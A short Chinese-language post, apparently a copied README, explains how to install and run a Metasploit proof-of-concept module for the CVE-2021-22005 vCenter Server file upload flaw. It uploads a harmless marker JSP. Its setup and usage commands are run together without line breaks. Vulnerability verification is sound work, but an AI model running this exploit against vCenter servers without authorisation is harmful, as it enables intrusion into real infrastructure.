**概述**

**CVE-2021-22005-metasploit**

关于 CVE-2021-22005 VMware vCenter Server 的 metasploit 脚本（POC/EXP）包含任意文件上传漏洞

  

**POC准备**

*   
*   
*   
*   
*   
*   

```
git clone https://github.com/TaroballzChen/CVE-2021-22005-metasploitcd CVE-2021-22005-metasploitmkdir -p ~/.msf4/modules/auxiliary/scanner/httpcp vmware_vcenter_server_file_upload_poc.py ~/.msf4/modules/auxiliary/scanner/http/chmod +x ~/.msf4/modules/auxiliary/scanner/http/vmware_vcenter_server_file_upload_poc.pymsfconsole
```

**poc使用**  

*   
*   
*   
*   

```
set rhost <vuln ip/host>set port <vuln port>set ssl <default: true for https>exploit
```

**结果**

该脚本将上传一个无害的jsp，其中包含base64编码的“Could be vuln by CVE-2021-22005”文本
